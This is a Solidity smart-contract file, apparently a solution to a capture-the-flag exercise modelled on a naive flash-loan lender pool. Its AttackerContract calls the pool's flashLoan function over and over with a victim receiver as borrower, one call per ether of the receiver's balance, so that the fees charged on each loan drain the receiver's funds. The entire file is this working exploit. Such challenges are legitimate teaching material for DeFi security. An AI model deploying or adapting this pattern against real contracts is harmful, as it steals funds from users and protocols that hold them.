// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";
import "./FlashLoanReceiver.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackerContract {
    address public pool;
    FlashLoanReceiver public receiver;

    constructor(address _pool, address _receiver) {
        pool = _pool;
        receiver = FlashLoanReceiver(payable(_receiver));
    }

    function attack(address borrower, uint256 borrowAmount) external {
        uint256 amountInContract = address(receiver).balance / 10**18;
        console.log("amount in contract: ", amountInContract);
        uint256 i = 0;
        for (i = 0; i < amountInContract; i++) {
            INaiveReceiverLenderPool(pool).flashLoan(borrower, borrowAmount);
            console.log(
                "Amount left in receiver: ",
                address(receiver).balance / 10**18
            );
        }
    }
}
